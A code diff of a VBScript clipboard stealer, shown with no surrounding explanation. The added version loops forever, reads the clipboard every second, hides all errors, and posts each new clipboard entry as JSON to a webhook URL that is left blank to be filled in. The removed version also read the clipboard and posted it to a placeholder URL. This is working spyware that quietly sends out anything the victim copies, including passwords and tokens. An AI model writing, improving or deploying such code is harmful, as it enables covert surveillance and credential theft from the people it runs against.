@@ -1,99 +1,58 @@
-Option Explicit
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objHTML = CreateObject("htmlfile")
 
-Dim http, url, dataObj
-Dim clipboardText, postData
-Dim fso
+webhook = ""
 
-url = "https://your-url-here.com"
+lastText = ""
 
-Function UrlEncode(str)
-    Dim i, charCode, char, result
-    result = ""
-
-    For i = 1 To Len(str)
-        char = Mid(str, i, 1)
-        charCode = Asc(char)
-
-        Select Case charCode
-            Case 48 To 57, 65 To 90, 97 To 122
-                result = result & char
-            Case 32
-                result = result & "+"
-            Case Else
-                result = result & "%" & Right("0" & Hex(charCode), 2)
-        End Select
-    Next
-
-    UrlEncode = result
-End Function
-
-On Error Resume Next
-
-'-----------------------------
-' Get clipboard text
-'-----------------------------
 Do
-Set dataObj = CreateObject("MSForms.DataObject")
+    On Error Resume Next
 
-If Err.Number <> 0 Then
-    WScript.Echo "Failed to create MSForms.DataObject. Error: " & Err.Description
-    WScript.Quit 1
-End If
+    current = ""
+    current = objHTML.parentWindow.clipboardData.getData("text")
 
-dataObj.GetFromClipboard
-clipboardText = dataObj.GetText
+    If Err.Number <> 0 Then
+        Err.Clear
+        current = ""
+    End If
 
-If Err.Number <> 0 Then
-    WScript.Echo "Failed to read clipboard. Error: " & Err.Description
-    WScript.Quit 1
-End If
+    On Error GoTo 0
 
-If Len(clipboardText) = 0 Then
-    WScript.Echo "Clipboard is empty."
-    WScript.Quit 0
-End If
+    If Not IsNull(current) Then
 
-'-----------------------------
-' Build POST data (properly encoded)
-'-----------------------------
-postData = "clip=" & UrlEncode(clipboardText)
+        current = CStr(current)
+        current = Trim(current)
 
-'-----------------------------
-' Create HTTP object
-'-----------------------------
-Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        If Len(current) > 0 Then
 
-If Err.Number <> 0 Then
-    WScript.Echo "Failed to create HTTP object. Error: " & Err.Description
-    WScript.Quit 1
-End If
+            If Len(current) > 1900 Then
+                current = Left(current, 1900)
+            End If
 
-'-----------------------------
-' Send request
-'-----------------------------
-http.Open "POST", url, False
-http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-http.setRequestHeader "User-Agent", "VBScript-Client"
+            safeText = Replace(current, vbCrLf, " ")
+            safeText = Replace(safeText, vbCr, " ")
+            safeText = Replace(safeText, vbLf, " ")
+            safeText = Replace(safeText, """", "'")
 
-http.Send postData
+            If current <> lastText Then
 
-'-----------------------------
-' Check response
-'-----------------------------
-If Err.Number <> 0 Then
-    WScript.Echo "HTTP request failed. Error: " & Err.Description
-    WScript.Quit 1
-End If
+                json = "{""content"": """ & safeText & """}"
 
-If http.Status >= 200 And http.Status < 300 Then
-    WScript.Echo "Success. Server response:"
-    WScript.Echo http.ResponseText
-Else
-    WScript.Echo "Request failed. HTTP Status: " & http.Status
-    WScript.Echo http.ResponseText
-End If
+                On Error Resume Next
 
-On Error GoTo 0
+                Set http = CreateObject("MSXML2.XMLHTTP")
+                http.Open "POST", webhook, False
+                http.setRequestHeader "Content-Type", "application/json"
+                http.Send json
 
-WScript.Sleep 500  ' check every 0.5 second
+                Err.Clear
+                On Error GoTo 0
+
+                lastText = current
+            End If
+        End If
+    End If
+
+    WScript.Sleep 1000
 Loop
